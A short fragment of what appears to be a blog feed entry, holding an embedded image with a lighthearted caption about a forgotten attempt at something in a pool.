-<div class='image center'><img  src="https://i.imgur.com/EExUThOl.jpg" width="480" height="640" title="I can't remember what we were trying to do in the pool." ><div class='caption'>I can&#8217;t remember what we were trying to do in the pool.</div></div>
-
-
 
 ]]></content>
   </entry>
